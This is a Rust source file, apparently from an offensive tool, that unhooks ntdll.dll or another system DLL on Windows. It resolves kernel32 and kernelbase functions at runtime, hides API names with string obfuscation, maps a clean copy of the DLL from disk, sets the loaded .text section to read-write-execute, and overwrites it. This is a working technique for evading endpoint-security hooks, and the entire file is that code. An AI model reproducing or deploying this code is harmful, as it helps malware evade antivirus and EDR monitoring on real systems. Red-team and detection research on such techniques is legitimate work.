use std::{ffi::OsStr, iter::once, mem, os::windows::prelude::OsStrExt, ptr};

use winapi::{
    shared::{
        basetsd::SIZE_T,
        minwindef::{BYTE, DWORD, FALSE, HMODULE, LPVOID, BOOL, PDWORD},
        ntdef::{HANDLE, LPCWSTR},
    },
    um::{
        fileapi::OPEN_EXISTING,
        handleapi::INVALID_HANDLE_VALUE,
        memoryapi::FILE_MAP_READ,
        psapi::{MODULEINFO, LPMODULEINFO},
        winnt::{
            FILE_SHARE_READ, GENERIC_READ, IMAGE_FILE_HEADER, PAGE_EXECUTE_READWRITE,
            PAGE_READONLY, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, PIMAGE_SECTION_HEADER, SEC_IMAGE,
        }, minwinbase::LPSECURITY_ATTRIBUTES,
    }
};

use crate::handle;

type GetModuleHandleW = unsafe extern "system" fn(
    lpModuleName: LPCWSTR
) -> HMODULE;

type GetCurrentProcess = unsafe extern "system" fn(
) -> HANDLE;

type GetModuleInformation = unsafe extern "system" fn(
    hProcess: HANDLE, 
    hModule: HMODULE, 
    lpmodinfo: LPMODULEINFO, 
    cb: DWORD
) -> BOOL;

type CreateFileW = unsafe extern "system" fn(
    lpFileName: LPCWSTR, 
    dwDesiredAccess: DWORD, 
    dwShareMode: DWORD, 
    lpSecurityAttributes: LPSECURITY_ATTRIBUTES, 
    dwCreationDisposition: DWORD, 
    dwFlagsAndAttributes: DWORD, 
    hTemplateFile: HANDLE
) -> HANDLE;

type CreateFileMappingW = unsafe extern "system" fn(
    hFile: HANDLE, 
    lpFileMappingAttributes: LPSECURITY_ATTRIBUTES, 
    flProtect: DWORD, 
    dwMaximumSizeHigh: DWORD, 
    dwMaximumSizeLow: DWORD, 
    lpName: LPCWSTR
) -> HANDLE;

type MapViewOfFile = unsafe extern "system" fn(
    hFileMappingObject: HANDLE, 
    dwDesiredAccess: DWORD, 
    dwFileOffsetHigh: DWORD, 
    dwFileOffsetLow: DWORD, 
    dwNumberOfBytesToMap: SIZE_T
) -> LPVOID;

type VirtualProtect = unsafe extern "system" fn(
    lpAddress: LPVOID, 
    dwSize: SIZE_T, 
    flNewProtect: DWORD, 
    lpflOldProtect: PDWORD
) -> BOOL;

type CloseHandle = unsafe extern "system" fn(
    hObject: HANDLE
) -> BOOL;

type FreeLibrary = unsafe extern "system" fn(
    hLibModule: HMODULE
) -> BOOL;

#[derive(Copy, Clone)]
struct WinApiFunctionPtrs {
    pub get_module_handle_w: GetModuleHandleW,
    pub get_current_process: GetCurrentProcess,
    pub get_module_information: GetModuleInformation,
    pub create_file_w: CreateFileW,
    pub create_file_mapping_w: CreateFileMappingW,
    pub map_view_of_file: MapViewOfFile,
    pub virtual_protect: VirtualProtect,
    pub close_handle: CloseHandle,
    pub free_library: FreeLibrary
}

impl WinApiFunctionPtrs {
    
    fn new() -> Self {
        unsafe {

            let mut win_api_func_ptrs = Self {
                get_module_handle_w: std::mem::transmute(ptr::null_mut::<GetModuleHandleW>()),
                get_current_process: std::mem::transmute(ptr::null_mut::<GetCurrentProcess>()),
                get_module_information: std::mem::transmute(ptr::null_mut::<GetModuleInformation>()),
                create_file_w: std::mem::transmute(ptr::null_mut::<CreateFileW>()),
                create_file_mapping_w: std::mem::transmute(ptr::null_mut::<CreateFileMappingW>()),
                map_view_of_file: std::mem::transmute(ptr::null_mut::<MapViewOfFile>()),
                virtual_protect: std::mem::transmute(ptr::null_mut::<VirtualProtect>()),
                close_handle: std::mem::transmute(ptr::null_mut::<CloseHandle>()),
                free_library: std::mem::transmute(ptr::null_mut::<FreeLibrary>())
            };

            let mut _proc_address = ptr::null_mut();
            let mut _proc_lookup_failed = false;
            
            // kernel32.dll
            let mut dll_handle = handle::get_module_handle(obfstr::obfstr!("kernel32.dll"));
            if dll_handle.is_null() {
                if cfg!(debug_assertions) {
                    println!("[!] Unable to get a handle for kernel32.dll");
                    _proc_lookup_failed = true;
                }
            } else {
                // GetModuleHandleW
                _proc_address = handle::get_proc_address_by_name(
                    dll_handle,
                    obfstr::obfstr!("GetModuleHandleW"),
                );
                if _proc_address.is_null() {
                    if cfg!(debug_assertions) {
                        println!("[!] Unable to get the address of GetModuleHandleW");
                        _proc_lookup_failed = true;
                    }
                } else {
                    win_api_func_ptrs.get_module_handle_w = std::mem::transmute(_proc_address);
                }

                // CreateFileW
                _proc_address = handle::get_proc_address_by_name(
                    dll_handle,
                    obfstr::obfstr!("CreateFileW"),
                );
                if _proc_address.is_null() {
                    if cfg!(debug_assertions) {
                        println!("[!] Unable to get the address of CreateFileW");
                        _proc_lookup_failed = true;
                    }
                } else {
                    win_api_func_ptrs.create_file_w = std::mem::transmute(_proc_address);
                }
                
                // CreateFileMappingW
                _proc_address = handle::get_proc_address_by_name(
                    dll_handle,
                    obfstr::obfstr!("CreateFileMappingW"),
                );
                if _proc_address.is_null() {
                    if cfg!(debug_assertions) {
                        println!("[!] Unable to get the address of CreateFileMappingW");
                        _proc_lookup_failed = true;
                    }
                } else {
                    win_api_func_ptrs.create_file_mapping_w = std::mem::transmute(_proc_address);
                }
            }

            // kernelbase.dll
            dll_handle = handle::get_module_handle(obfstr::obfstr!("kernelbase.dll"));
            if dll_handle.is_null() {
                if cfg!(debug_assertions) {
                    println!("[!] Unable to get a handle for kernelbase.dll");
                    _proc_lookup_failed = true;
                }
            } else {
                // GetCurrentProcess
                _proc_address = handle::get_proc_address_by_name(
                    dll_handle,
                    obfstr::obfstr!("GetCurrentProcess"),
                );
                if _proc_address.is_null() {
                    if cfg!(debug_assertions) {
                        println!("[!] Unable to get the address of GetCurrentProcess");
                        _proc_lookup_failed = true;
                    }
                } else {
                    win_api_func_ptrs.get_current_process = std::mem::transmute(_proc_address);
                }
                
                // GetModuleInformation
                _proc_address = handle::get_proc_address_by_name(
                    dll_handle,
                    obfstr::obfstr!("GetModuleInformation"),
                );
                if _proc_address.is_null() {
                    if cfg!(debug_assertions) {
                        println!("[!] Unable to get the address of GetModuleInformation");
                        _proc_lookup_failed = true;
                    }
                } else {
                    win_api_func_ptrs.get_module_information = std::mem::transmute(_proc_address);
                }

                // MapViewOfFile
                _proc_address = handle::get_proc_address_by_name(
                    dll_handle,
                    obfstr::obfstr!("MapViewOfFile"),
                );
                if _proc_address.is_null() {
                    if cfg!(debug_assertions) {
                        println!("[!] Unable to get the address of MapViewOfFile");
                        _proc_lookup_failed = true;
                    }
                } else {
                    win_api_func_ptrs.map_view_of_file = std::mem::transmute(_proc_address);
                }

                // VirtualProtect
                _proc_address = handle::get_proc_address_by_name(
                    dll_handle,
                    obfstr::obfstr!("VirtualProtect"),
                );
                if _proc_address.is_null() {
                    if cfg!(debug_assertions) {
                        println!("[!] Unable to get the address of VirtualProtect");
                        _proc_lookup_failed = true;
                    }
                } else {
                    win_api_func_ptrs.virtual_protect = std::mem::transmute(_proc_address);
                }
                
                // CloseHandle
                _proc_address = handle::get_proc_address_by_name(
                    dll_handle,
                    obfstr::obfstr!("CloseHandle"),
                );
                if _proc_address.is_null() {
                    if cfg!(debug_assertions) {
                        println!("[!] Unable to get the address of CloseHandle");
                        _proc_lookup_failed = true;
                    }
                } else {
                    win_api_func_ptrs.close_handle = std::mem::transmute(_proc_address);
                }
                
                // FreeLibrary
                _proc_address = handle::get_proc_address_by_name(
                    dll_handle,
                    obfstr::obfstr!("FreeLibrary"),
                );
                if _proc_address.is_null() {
                    if cfg!(debug_assertions) {
                        println!("[!] Unable to get the address of FreeLibrary");
                        _proc_lookup_failed = true;
                    }
                } else {
                    win_api_func_ptrs.free_library = std::mem::transmute(_proc_address);
                }

                if cfg!(debug_assertions) {
                    if _proc_lookup_failed {
                        println!("[!] One or more function pointers weren't resolved");
                    } else {
                        println!("[*] All function pointers were successfully resolved");
                    }
                }
            }
            win_api_func_ptrs
        }
    }
}

fn to_win_string(string: &str) -> Vec<u16> {
    OsStr::new(string).encode_wide().chain(once(0)).collect()
}

fn vec_to_string(vec: &[u8]) -> String {
    String::from_utf8(vec.to_vec())
        .unwrap()
        .trim_matches(char::from(0))
        .to_string()
}

pub fn unhook_ntdll() -> bool {
    unhook_system_dll("ntdll.dll")
}

pub fn unhook_system_dll(system_dll: &str) -> bool {
    const NT_HEADERS_SIGNATURE: u32 = 0x4550;
    const IMAGE_SIZEOF_SECTION_HEADER: u32 = 40;

    unsafe {

        let win_api_function_ptrs = WinApiFunctionPtrs::new();

        if cfg!(debug_assertions) {
            println!("[*] Getting a handle to the current process");
        }

        let h_current_process = (win_api_function_ptrs.get_current_process)();

        let mut mi_module_info: MODULEINFO = MODULEINFO::default();

        if cfg!(debug_assertions) {
            println!("[*] Getting a handle to the possibly hooked {} module loaded in the current process", system_dll);
        }

        let h_ntdll_module: HMODULE = (win_api_function_ptrs.get_module_handle_w)(to_win_string(system_dll).as_ptr());

        if h_ntdll_module.is_null() {
            if cfg!(debug_assertions) {
                println!("[!] Failed to get module handle to {}!", system_dll);
            }
            return false;
        }

        if cfg!(debug_assertions) {
            println!(
                "[*] Getting module information for the hooked {} module",
                system_dll
            );
        }

        let success = (win_api_function_ptrs.get_module_information)(
            h_current_process,
            h_ntdll_module,
            &mut mi_module_info,
            mem::size_of::<MODULEINFO>() as u32,
        );
        if success == 0 {
            if cfg!(debug_assertions) {
                println!("[!] GetModuleInformation() failed!");
            }
            return false;
        }

        let p_hooked_ntdll_base_address = mi_module_info.lpBaseOfDll;

        if cfg!(debug_assertions) {
            println!(
                "[*] Getting a file handle for unhooked {} on disk",
                system_dll
            );
        }

        let system_dll_path = format!(
            "{}{}",
            obfstr::obfstr!("c:\\windows\\system32\\"),
            system_dll
        );

        if cfg!(debug_assertions) {
            println!("[*] System DLL path: {}", system_dll_path);
        }

        let h_dll_file = (win_api_function_ptrs.create_file_w)(
            to_win_string(&system_dll_path).as_ptr(),
            GENERIC_READ,
            FILE_SHARE_READ,
            ptr::null_mut(),
            OPEN_EXISTING,
            0,
            ptr::null_mut(),
        );
        if h_dll_file == INVALID_HANDLE_VALUE {
            if cfg!(debug_assertions) {
                println!("[!] Failed getting file handle for {}", system_dll);
            }
            return false;
        }

        if cfg!(debug_assertions) {
            println!(
                "[*] Creating a RO file mapping for {} on disk",
                system_dll
            );
        }

        let h_ntdll_file_mapping = (win_api_function_ptrs.create_file_mapping_w)(
            h_dll_file,
            ptr::null_mut(),
            PAGE_READONLY | SEC_IMAGE,
            0,
            0,
            ptr::null_mut(),
        );
        if h_ntdll_file_mapping.is_null() {
            if cfg!(debug_assertions) {
                println!(
                    "[!] Failed to create a RO file mapping for {}",
                    system_dll
                );
            }
            return false;
        }

        if cfg!(debug_assertions) {
            println!(
                "[*] Creating RO mapped file view of {} on disk",
                system_dll
            );
        }

        let h_ntdll_mapping_address = (win_api_function_ptrs.map_view_of_file)(h_ntdll_file_mapping, FILE_MAP_READ, 0, 0, 0);
        if h_ntdll_mapping_address.is_null() {
            if cfg!(debug_assertions) {
                println!(
                    "[*] Failed creating RO mapped file view of {}",
                    system_dll
                );
            }
            return false;
        }

        if cfg!(debug_assertions) {
            println!(
                "[*] Getting the DOS header from the loaded (hooked) {} module.",
                system_dll
            );
        }

        let hooked_dos_header = p_hooked_ntdll_base_address as PIMAGE_DOS_HEADER;

        if cfg!(debug_assertions) {
            println!("[*] Getting the PE header: hooked {} base address plus the file address of new exe header (e_lfanew).", system_dll);
        }

        let hooked_nt_header = (p_hooked_ntdll_base_address as *const BYTE)
            .offset((*hooked_dos_header).e_lfanew as isize)
            as PIMAGE_NT_HEADERS;
        if (*hooked_nt_header).Signature != NT_HEADERS_SIGNATURE {
            if cfg!(debug_assertions) {
                println!("[!] Failed getting the PE header");
            }
            return false;
        }

        if cfg!(debug_assertions) {
            println!("[*] Iterating through each section of the IMAGE_FILE_HEADER->NumberOfSections field, looking for .text.");
        }

        for i in 0..(*hooked_nt_header).FileHeader.NumberOfSections {
            let hooked_section_header: PIMAGE_SECTION_HEADER =
                (hooked_nt_header as *const BYTE).offset(
                    (mem::size_of::<IMAGE_FILE_HEADER>()
                        + mem::size_of::<DWORD>()
                        + (*hooked_nt_header).FileHeader.SizeOfOptionalHeader as usize)
                        as isize
                        + (IMAGE_SIZEOF_SECTION_HEADER * i as u32) as isize,
                ) as PIMAGE_SECTION_HEADER;

            let section_name = vec_to_string(&(*hooked_section_header).Name);

            if cfg!(debug_assertions) {
                println!("\t[*] Section {}: {}", i, section_name);
            }

            if section_name == ".text" {
                if cfg!(debug_assertions) {
                    println!("\t\t[*] Found the .text section, processing");
                }

                let hooked_virtual_address_start = (p_hooked_ntdll_base_address as *const BYTE)
                    .offset((*hooked_section_header).VirtualAddress as isize)
                    as LPVOID;

                let hooked_virtual_address_size: SIZE_T =
                    *(*hooked_section_header).Misc.VirtualSize() as usize;

                if cfg!(debug_assertions) {
                    println!(
                        "\t\t[*] The size of the .text section is {} bytes",
                        hooked_virtual_address_size
                    );
                }

                let mut old_protection: DWORD = 0;

                if cfg!(debug_assertions) {
                    println!(
                        "\t\t[*] Address of the hooked .text section: {:p}",
                        hooked_virtual_address_start
                    );

                    println!("\t\t[*] Changing memory protection status of the hooked .text section to RWX");
                }

                let mut is_protected = (win_api_function_ptrs.virtual_protect)(
                    hooked_virtual_address_start,
                    hooked_virtual_address_size,
                    PAGE_EXECUTE_READWRITE,
                    &mut old_protection,
                );
                if is_protected == FALSE {
                    if cfg!(debug_assertions) {
                        println!("[!] Failed changing memory protection status of the hooked .text section");
                    }
                    return false;
                }

                let clean_virtual_address_start = (h_ntdll_mapping_address as *const BYTE)
                    .offset((*hooked_section_header).VirtualAddress as isize)
                    as LPVOID;

                if cfg!(debug_assertions) {
                    println!(
                        "\t\t[*] Address of the clean .text section: {:p}",
                        clean_virtual_address_start
                    );

                    println!(
                        "\t\t[*] Copying the clean .text section into the hooked .text section"
                    );
                }

                ptr::copy_nonoverlapping(
                    clean_virtual_address_start as *const BYTE,
                    hooked_virtual_address_start as *mut BYTE,
                    hooked_virtual_address_size,
                );

                if cfg!(debug_assertions) {
                    println!(
                        "\t\t[*] Changing memory protection status of the hooked .text section back"
                    );
                }

                is_protected = (win_api_function_ptrs.virtual_protect)(
                    hooked_virtual_address_start,
                    hooked_virtual_address_size,
                    old_protection,
                    &mut old_protection,
                );
                if is_protected == FALSE {
                    if cfg!(debug_assertions) {
                        println!("[!] Failed changing memory protection status of the hooked .text section back");
                    }
                    return false;
                }

                break;
            }
        }

        (win_api_function_ptrs.close_handle)(h_current_process);
        (win_api_function_ptrs.close_handle)(h_dll_file);
        (win_api_function_ptrs.close_handle)(h_ntdll_file_mapping);

        (win_api_function_ptrs.free_library)(h_ntdll_module);

        if cfg!(debug_assertions) {
            println!("[!] Unhooking complete!");
        }

        return true;
    }
}
